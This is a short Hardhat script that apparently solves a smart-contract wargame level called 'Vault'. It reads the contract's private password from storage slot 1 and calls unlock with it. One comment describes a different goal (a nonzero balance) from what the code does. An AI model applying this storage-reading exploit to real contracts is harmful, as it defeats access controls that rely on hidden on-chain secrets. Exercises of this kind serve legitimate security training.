import { ethers } from "hardhat";
import { Vault__factory } from "../typechain-types";

async function main() {
  // The goal of this level is to make the balance of the contract greater than zero.

  let tx; // will have to wait for each tx

  let [deployer] = await ethers.getSigners();
  let contract = "0xE037F67cD9666d408c9a489011952e605517CC09";
  let vault = await new Vault__factory(deployer).attach(contract);

  let password = await ethers.provider.getStorageAt(contract, 1);

  tx = await vault.unlock(password);
  await tx.wait();
  console.log(await vault.locked());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
